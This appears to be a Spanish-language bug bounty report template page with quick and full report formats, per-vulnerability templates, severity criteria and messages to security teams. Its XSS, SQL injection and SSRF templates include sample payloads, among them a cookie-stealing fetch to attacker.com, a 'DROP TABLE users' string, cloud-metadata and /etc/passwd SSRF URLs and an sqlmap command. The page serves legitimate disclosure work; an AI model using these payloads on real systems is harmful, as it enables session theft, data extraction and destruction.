# 🐛 Plantilla de informe de bug bounty

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---

## 🎯 Plantilla rápida

````markdown
## Resumen
[One-line description of the vulnerability]

## Severidad
[Critical/High/Medium/Low] - CVSS: X.X

## Tipo de vulnerabilidad
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/endpoint
`https://example.com/vulnerable-endpoint`

## Pasos para reproducir
1. Paso 1
2. Paso 2
3. Paso 3

## Impacto
[What an attacker can achieve]

## Prueba de concepto
[Code/Screenshots/Video]

## Corrección
[How to fix it]
````

---

## 📝 Plantilla de informe completo

### Formato del título
```
[Severity] [Vulnerability Type] en [Feature/Endpoint] permite [Impact]

Ejemplos:
- [Critical] La inyección SQL en el formulario de acceso permite extraer la base de datos
- [High] El XSS almacenado en comentarios permite tomar el control de cuentas
- [Medium] IDOR en /api/users/{id} expone datos personales de otros usuarios
```

---

## 📋 Estructura detallada del informe

````markdown
# [Vulnerability Type] en [Feature/Endpoint]

## Resumen
Se descubrió una vulnerabilidad de tipo [vulnerability type] en [feature/endpoint] que 
permite a un atacante [impact]. Esta vulnerabilidad afecta a [scope/users].

## Evaluación de severidad

| Métrica | Valor |
|--------|-------|
| **Severidad** | Crítica / Alta / Media / Baja |
| **Puntuación CVSS** | X.X |
| **Vector CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Name] |

## Detalles de la vulnerabilidad

### Activo afectado
- **URL:** `https://example.com/path/to/endpoint`
- **Parámetro:** `parameter_name`
- **Método:** GET/POST
- **Autenticación:** Necesaria/no necesaria

### Código/configuración vulnerable
[If visible/applicable]

## Pasos para reproducir

### Requisitos previos
- Cuenta necesaria: sí/no
- Acceso especial necesario: [describe]
- Navegador/herramienta: [specify]

### Pasos de reproducción

1. **Acceder al endpoint vulnerable**
   ```
   https://example.com/vulnerable-page
   ```

2. **Inyectar el payload**
   ```
   [Payload here]
   ```

3. **Observar el resultado**
   - [What happens]

### Solicitud HTTP
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### Respuesta HTTP
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Prueba de concepto

### Payload utilizado
```
[Your payload here]
```

### Pruebas mediante capturas de pantalla
![Description](attachment_url)

### PoC en vídeo
[Link to video demonstration]

### Script de PoC automatizado (opcional)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Evaluación del impacto

### Impacto técnico
- **Confidencialidad:** [Data that can be accessed]
- **Integridad:** [Data that can be modified]
- **Disponibilidad:** [Service disruption possible]

### Impacto en el negocio
- [Financial impact]
- [Reputational damage]
- [Regulatory/Compliance violations]
- [Number of affected users]

### Escenario de ataque
Un atacante podría explotar esta vulnerabilidad para:
1. [Specific action 1]
2. [Specific action 2]
3. [Specific action 3]

## Recomendaciones de corrección

### Corrección inmediata
[Quick fix to mitigate]

### Solución a largo plazo
[Proper remediation]

### Ejemplo de código corregido
```python
# Antes (vulnerable)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Después (corregido)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Referencias
- [OWASP Link]
- [CWE Link]
- [Related CVEs]
- [Blog posts/Research]

## Cronología
| Fecha | Acción |
|------|--------|
| YYYY-MM-DD | Vulnerabilidad descubierta |
| YYYY-MM-DD | Informe enviado |
| YYYY-MM-DD | Recepción confirmada por el proveedor |
| YYYY-MM-DD | Corrección desplegada |
| YYYY-MM-DD | Recompensa concedida |
````

---

## 🔥 Plantillas por tipo de vulnerabilidad

### XSS (Cross-Site Scripting)

````markdown
## Resumen
Una vulnerabilidad XSS reflejada/almacenada en [endpoint] permite a los atacantes ejecutar 
JavaScript arbitrario en los navegadores de las víctimas.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Impacto
- Secuestro de sesiones mediante robo de cookies
- Toma de control de cuentas
- Registro de pulsaciones de teclado
- Ataques de phishing
- Distribución de malware

## PoC
```javascript
// Robo de cookies
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### Inyección SQL

````markdown
## Resumen
La inyección SQL en [parameter], en [endpoint], permite extraer el contenido de la base de datos.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Pruebas
- Base de datos: MySQL 8.0
- Tablas extraídas: users, orders, payments
- Registros accesibles: 10,000+

## Comando de SQLMap
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

````markdown
## Resumen
La vulnerabilidad IDOR en [endpoint] permite acceder a [resource] de otros usuarios.

## Reproducción
1. Iniciar sesión como usuario A (ID: 100)
2. Acceder a: `GET /api/users/100/profile`
3. Cambiar el ID a 101: `GET /api/users/101/profile`
4. Observar que se devuelven los datos del usuario B

## Impacto
- Exposición de datos personales (nombre, correo y dirección)
- [X] datos de usuarios accesibles
- Incumplimiento del RGPD o de la privacidad

## Pruebas
| Solicitud | Respuesta |
|---------|----------|
| `/api/users/100` | Datos del usuario A ✓ |
| `/api/users/101` | Datos del usuario B ✗ |
| `/api/users/102` | Datos del usuario C ✗ |
````

### SSRF (Server-Side Solicitud Forgery)

````markdown
## Resumen
SSRF en [feature] permite realizar solicitudes a servicios internos.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Recursos internos accedidos
- Endpoint de metadatos de AWS
- Servidor Redis interno
- Sistema de archivos local

## Pruebas
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Evasión de autenticación

````markdown
## Resumen
La evasión de autenticación en [feature] permite acceder a [resource] sin autorización.

## Método de evasión
[Describe the bypass technique]

## Reproducción
1. Acceder al endpoint protegido sin autenticación
2. [Specific technique]
3. Acceso concedido

## Impacto
- Acceso al panel de administración
- Suplantación de usuarios
- Manipulación de datos
````

---

> **Criterios orientativos:** P1-P4 y las severidades de estos ejemplos no son universales; deben ajustarse al impacto demostrado y a las reglas del programa. Los vectores CVSS del original usan la versión 3.1. Véase [FIRST CVSS 3.1](https://www.first.org/cvss/v3.1/specification-document).

## 📊 Criterios de severidad

### Crítica (P1)
```
- RCE (ejecución remota de código)
- Inyección SQL con extracción de datos
- Evasión de autenticación con acceso de administrador
- Toma de control completa de cuentas
- Manipulación de pagos o finanzas
- Datos personales de todos los usuarios expuestos
```

### Alta (P2)
```
- XSS almacenado con impacto significativo
- IDOR con acceso a datos sensibles
- SSRF hacia servicios internos
- Escalada de privilegios
- Exposición de datos sensibles
```

### Media (P3)
```
- XSS reflejado
- CSRF sobre acciones sensibles
- Divulgación de información
- Evasión del límite de solicitudes
- Fijación de sesión
```

### Baja (P4)
```
- Self-XSS
- IDOR sin datos sensibles
- Ausencia de cabeceras de seguridad
- Mensajes de error demasiado detallados
- Enumeración de nombres de usuario
```

---

## ✅ Lista de comprobación del envío

````markdown
## Antes del envío

□ Título claro y descriptivo
□ Evaluación precisa de la severidad
□ Reproducción paso a paso
□ Prueba de concepto funcional
□ Impacto explicado con claridad
□ Capturas o vídeo adjuntos
□ Corrección propuesta
□ Activo confirmado dentro del alcance
□ Ausencia de duplicados comprobada mediante búsqueda
□ Gramática y ortografía revisadas
□ Datos sensibles ocultados
□ Información de contacto incluida
````

---

## 💡 Consejos prácticos

### Buenas prácticas ✅
```
✓ Sé claro y conciso
✓ Incluye todos los detalles necesarios
✓ Proporciona una PoC funcional
✓ Explica el impacto
✓ Propón una corrección
✓ Mantén un trato profesional y respetuoso
✓ Sigue una divulgación responsable
✓ Responde a las preguntas con prontitud
```

### Prácticas que evitar ❌
```
✗ No accedas a datos reales de usuarios
✗ No realices pruebas en producción
✗ No excedas el alcance
✗ No uses escáneres automatizados sin permiso
✗ No divulgues antes de la corrección
✗ No presiones de forma agresiva por la recompensa
✗ No envíes duplicados
✗ No envíes problemas puramente teóricos
```

---

## 📧 Plantillas de comunicación

### Informe inicial
```
Hola, [Security Team]:

He descubierto una vulnerabilidad [vulnerability type] de severidad [severity] en 
[product/feature]. El informe contiene todos los detalles.

Resumen: [One line]
Impacto: [Brief impact]
PoC: [Attached/Included]

Quedo a vuestra disposición para ampliar la información.

Un saludo,
[Your name]
[HackerOne/Bugcrowd profile]
```

### Seguimiento
```
Hola:

Quisiera consultar el estado del informe #[ID], enviado el [date]. 
¿Podríais facilitarme una actualización de su estado?

Gracias.
```

### Consulta sobre la recompensa
```
Gracias por evaluar mi informe. Considero que la severidad debería ser 
[higher/different] por los siguientes motivos:

1. [Reason 1]
2. [Reason 2]

¿Podríais reconsiderar el importe de la recompensa?
```

---

**Volver a informes:** [📝 Plantillas de informes](../../README.md#-reporting-templates)
